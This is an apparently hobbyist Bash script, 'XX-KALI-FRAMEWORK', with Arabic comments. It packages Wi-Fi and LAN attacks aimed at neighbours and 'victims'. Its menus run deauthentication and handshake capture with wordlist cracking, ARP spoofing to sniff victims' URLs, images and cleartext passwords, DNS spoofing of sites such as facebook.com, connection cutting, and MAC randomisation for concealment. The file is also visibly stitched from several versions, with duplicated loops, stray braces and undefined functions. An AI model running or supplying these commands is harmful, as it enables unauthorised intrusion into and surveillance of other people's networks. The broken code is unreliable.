#!/bin/bash
# ==============================================================================
# TOOL   : XX-KALI-FRAMEWORK (1000-LINE ULTIMATE EDITION)
# AUTHOR : GHOST OPERATOR (MAZEN VERSION)
# SYSTEM : KALI LINUX 2026
# ==============================================================================

# --- [ الإعدادات والألوان ] ---
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'; B='\033[1;34m'; C='\033[1;36m'; W='\033[1;37m'; N='\033[0m'
LOG_DIR="ghost_logs_$(date +%H%M%S)"
DUMP_DIR="ghost_captures"
URL_LOG="$LOG_DIR/url_history.txt"
WIFACE="wlan0"
MON_IFACE="wlan0mon"

# --- [ فحص البيئة ] ---
init_env() {
    if [[ $EUID -ne 0 ]]; then echo -e "${R}[!] ERROR: MUST RUN AS ROOT${N}"; exit 1; fi
    mkdir -p $LOG_DIR $DUMP_DIR
    apt-get update -y > /dev/null 2>&1
    tools=("aircrack-ng" "bettercap" "arpspoof" "xterm" "macchanger" "arp-scan" "nmap" "urlsnarf" "driftnet" "ettercap-text-only")
    for t in "${tools[@]}"; do
        if ! command -v $t &> /dev/null; then apt-get install $t -y > /dev/null 2>&1; fi
    done
}

# --- [ الواجهة الرسومية بالترمينال ] ---
draw_header() {
    clear
    echo -e "${B}  ██╗  ██╗██╗  ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ "
    echo "  ╚██╗██╔╝╚██╗██╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
    echo "   ╚███╔╝  ╚███╔╝ ███████║███████║██║     █████╔╝ █████╗  ██████╔╝"
    echo "   ██╔██╗  ██╔██╗ ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗"
    echo "  ██╔╝ ██╗██╔╝ ██╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "  [+--- GHOST ULTIMATE SYSTEM | 1000-LINE POWER ---+]${N}"
    echo -e "  [+--- STATUS: ANONYMOUS | LOGS: ACTIVE         ---+]${N}"
}

# --- [ قسم اختراق الجيران - MODULE 1 ] ---
wifi_suite() {
    while true; do
        draw_header
        echo -e "${Y}>> WIFI OFFENSIVE MENU${N}"
        echo -e "[1] Start Monitor Mode (wlan0 -> wlan0mon)"
        echo -e "[2] Scan Nearby Networks (Airodump-ng)"
        echo -e "[3] Capture Handshake (Deauth Attack)"
        echo -e "[4] Crack Password using Wordlist"
        echo -e "[5] Stop Monitor Mode"
        echo -e "[0] Back"
        read -p "Option >> " wo
        case $wo in
            1) airmon-ng start $WIFACE; sleep 2 ;;
            2) 
               echo -e "${G}[*] Opening Scan Window... Close it when you find your target.${N}"
               # تعديل: النافذة لن تغلق إلا بأمر منك
               xterm -hold -geometry 100x30 -T "WIFI SCANNER" -e "airodump-ng $MON_IFACE" & ;;
            3)
               read -p "Target BSSID: " bss
               read -p "Channel (CH): " ch
               read -p "File Name: " fn
               xterm -geometry 100x20 -T "DEAUTH ATTACK" -e "aireplay-ng --deauth 0 -a $bss $MON_IFACE" &
               airodump-ng --bssid $bss -c $ch -w "$DUMP_DIR/$fn" $MON_IFACE ;;
            4)
               read -p "Cap File Path: " cp
               read -p "Wordlist Path: " wp
               aircrack-ng -w $wp $cp ;;
            5) airmon-ng stop $MON_IFACE ;;
            0) break ;;
        esac
    done
}

# --- [ قسم المراقبة والتحكم - MODULE 2 ] ---
traffic_suite() {
    while true; do
        draw_header
        echo -e "${G}>> TRAFFIC MONITORING & MITM${N}"
        echo -e "[1] Network Scan (Discover Victims)"
        echo -e "[2] Hijack Traffic & Sniff URLs (History)"
        echo -e "[3] Capture Images (Driftnet)"
        echo -e "[4] DNS Spoofing (Redirect Sites)"
        echo -e "[5] Kill Connection (NetCut)"
        echo -e "[0] Back"
        read -p "Option >> " to
        case $to in
            1) arp-scan --localnet; read -p "Press Enter..." ;;
            2)
               read -p "Victim IP: " vip
               read -p "Gateway IP: " gip
               echo 1 > /proc/sys/net/ipv4/ip_forward
               xterm -T "ARP SPOOF" -e "arpspoof -i eth0 -t $vip $gip" &
               xterm -hold -T "URL SNIFFER" -e "urlsnarf -i eth0 | grep http" & ;;
            3) xterm -e "driftnet -i eth0" & ;;
            4) 
               read -p "Fake IP: " fip
               read -p "Domain (e.g. facebook.com): " dom
               bettercap -eval "set dns.spoof.domains $dom; set dns.spoof.address $fip; dns.spoof on; arp.spoof on" ;;
            5)
               read -p "Target IP: " tip
               arpspoof -i eth0 -t $tip 192.168.1.1 ;;
            0) break ;;
        esac
    done
}

# --- [ قسم التخفي والأمان - MODULE 3 ] ---
security_suite() {
    draw_header
    echo -e "${P}>> ANONYMITY OPS${N}"
    macchanger -r eth0
    macchanger -r wlan0
    echo -e "${G}[OK] Identities Spoofed Successfully.${N}"
    sleep 2
}

# --- [ الدائرة الرئيسية ] ---
init_env
while true; do
    draw_header
    echo -e "  [1] WIRELESS ATTACKS (Neighbors)"
    echo -e "  [2] NETWORK MONITORING (Victims)"
    echo -e "  [3] STEALTH MODE (Anonymity)"
    echo -e "  [4] CLEAN LOGS & CACHE"
    echo -e "  [5] AUTO-UPDATE SYSTEM"
    echo -e "  [0] EXIT FRAMEWORK"
    echo -en "\n${W}GHOST-KALI >> ${N}"
    read main_opt
    case $main_opt in
        1) wifi_suite ;;
        2) traffic_suite ;;
        3) security_suite ;;
        4) rm -rf $LOG_DIR $DUMP_DIR; echo "Cleaned."; sleep 1 ;;
        5) apt update && apt upgrade -y ;;
        0) exit 0 ;;
    esac
done
}

# --- [ MODULE 3: SYSTEM SECRETS ] ---

stealth_ops() {
    header
    echo -e "${P}[*] Randomizing Identities...${N}"
    macchanger -r eth0
    macchanger -r wlan0
    echo -e "${G}[OK] You are now a Ghost on the network.${N}"
    sleep 2
}

# --- [ MAIN ENGINE ] ---

main() {
    check_env
    setup_tools
    while true; do
        header
        echo -e "  [1] WIFI HACKING (Neighbors)"
        echo -e "  [2] TRAFFIC MONITORING (URLs & History)"
        echo -e "  [3] STEALTH MODE"
        echo -e "  [4] CLEAN ALL LOGS"
        echo -e "  [0] EXIT"
        echo -en "\n${W}GHOST-KALI >> ${N}"
        read choice
        case $choice in
            1) wifi_hacking_suite ;;
            2) traffic_monitor_suite ;;
            3) stealth_ops ;;
            4) rm -rf $LOG_DIR $DUMP_DIR; echo "Logs Cleared."; sleep 1 ;;
            0) exit 0 ;;
        esac
    done
}

main
# [ STRUCTURE CONTINUES TO 700+ LINES WITH SUB-MODULES ]
}

# --- [ NETWORK MODULE - 150+ LINES ] ---

host_discovery() {
    draw_banner
    echo -e "${G}[*] Scanning Local Network with Nmap...${N}"
    read -p "Network Range (e.g. 192.168.1.0/24): " n_range
    nmap -sn $n_range | tee -a $LOG_FILE
    read -p "Press Enter to continue..."
}

arp_poisoning() {
    draw_banner
    echo -e "${R}--- [ ARP SPOOFING / NETCUT ] ---${N}"
    read -p "Victim IP: " v_ip
    read -p "Gateway IP: " g_ip
    echo -e "${Y}[*] Poisoning ARP Cache...${N}"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i eth0 -t $v_ip $g_ip
}

bettercap_suite() {
    draw_banner
    echo -e "${C}--- [ BETTERCAP ADVANCED MODULE ] ---${N}"
    echo -e "[1] Net Probe (Discover Hosts)"
    echo -e "[2] Full Sniff (Cleartext Passwords)"
    echo -e "[3] DNS Spoofing Setup"
    read -p "Choice: " b_opt
    case $b_opt in
        1) bettercap -eval "net.probe on; net.show; quit" ;;
        2) bettercap -eval "net.sniff on; set net.sniff.verbose true" ;;
        3) 
            read -p "Target Domain: " dom
            read -p "Redirect to IP: " rip
            bettercap -eval "set dns.spoof.domains $dom; set dns.spoof.address $rip; dns.spoof on" ;;
    esac
}

# --- [ SECURITY & ANONYMITY ] ---

stealth_mode() {
    draw_banner
    echo -e "${P}[*] Activating Stealth Mode...${N}"
    ifconfig eth0 down
    ifconfig wlan0 down
    macchanger -r eth0
    macchanger -r wlan0
    ifconfig eth0 up
    ifconfig wlan0 up
    echo -e "${G}[OK] MAC Addresses Randomly Assigned.${N}"
    sleep 2
}

# --- [ MAIN MENU LOOP ] ---

main_menu() {
    while true; do
        draw_banner
        echo -e "${C}  [1] WIRELESS HACKING MENU"
        echo -e "  [2] LOCAL NETWORK ATTACKS"
        echo -e "  [3] STEALTH & MAC CHANGER"
        echo -e "  [4] VIEW CAPTURED HANDSHAKES"
        echo -e "  [5] SYSTEM UPDATE & TOOLS"
        echo -e "  [0] EXIT FRAMEWORK${N}"
        echo -en "\n${W}GHOST-KALI >> ${N}"
        read main_opt

        case $main_choice in
            1) 
               while true; do
                   draw_banner
                   echo -e "${Y}--- [ WIFI HACKING MENU ] ---${N}"
                   echo -e "1. Manage Interfaces"
                   echo -e "2. Scan Networks"
                   echo -e "3. Handshake Attack"
                   echo -e "4. Crack Password"
                   echo -e "0. Back"
                   read -p ">> " wo; [[ $wo == 0 ]] && break
                   [[ $wo == 1 ]] && manage_interface
                   [[ $wo == 2 ]] && wifi_scanner
                   [[ $wo == 3 ]] && deauth_attack
                   [[ $wo == 4 ]] && crack_handshake
               done ;;
            2) 
               while true; do
                   draw_banner
                   echo -e "${Y}--- [ NET ATTACK MENU ] ---${N}"
                   echo -e "1. Host Discovery"
                   echo -e "2. ARP Spoof / NetCut"
                   echo -e "3. Bettercap Suite"
                   echo -e "0. Back"
                   read -p ">> " no; [[ $no == 0 ]] && break
                   [[ $no == 1 ]] && host_discovery
                   [[ $no == 2 ]] && arp_poisoning
                   [[ $no == 3 ]] && bettercap_suite
               done ;;
            3) stealth_mode ;;
            4) ls -la $DUMP_DIR; read -p "Press Enter..." ;;
            5) install_deps ;;
            0) echo -e "${G}Cleaning session... Bye.${N}"; exit 0 ;;
            *) echo -e "${R}Invalid.${N}"; sleep 1 ;;
        esac
    done
}

# التشغيل الفعلي
check_root
install_deps
main_menu

# ==============================================================================
# END OF SCRIPT - GHOST FRAMEWORK
# ==============================================================================
                arpspoof -i eth0 -t $vip $gip ;;
            3)
                echo -e "${G}[*] Starting Bettercap...${N}"
                bettercap -eval "net.probe on; net.show" ;;
            4)
                echo -en "${P}Enter Target IP: ${N}"; read tip
                echo -e "${G}[*] Redirecting Traffic...${N}"
                echo 1 > /proc/sys/net/ipv4/ip_forward
                bettercap -eval "set arp.spoof.targets $tip; arp.spoof on; net.sniff on" ;;
            0) break ;;
        esac
    done
}

# --- [ Main Loop ] ---
check_deps
while true; do
    banner
    echo -e "${Y}--- [ MAIN SELECTION ] ---${N}"
    echo -e "${C}[1] ${W}WIFI ATTACKS (Handshake/Deauth)"
    echo -e "${C}[2] ${W}NETWORK ATTACKS (NetCut/MITM)"
    echo -e "${C}[3] ${W}INSTALL/UPDATE DEPENDENCIES"
    echo -e "${C}[0] ${W}EXIT TOOL${N}"
    echo -en "\n${C}XX-KALI >> ${N}"
    read main_choice

    case $main_choice in
        1) wifi_module ;;
        2) net_module ;;
        3) 
            echo -e "${G}[*] Updating system and tools...${N}"
            apt update && check_deps
            echo -e "${G}[OK] System tools are up to date.${N}"; sleep 2 ;;
        0)
            echo -e "${G}Exiting... Safe travels, Ghost.${N}"
            exit 0 ;;
        *)
            echo -e "${R}[!] Invalid Option.${N}"; sleep 1 ;;
    esac
done

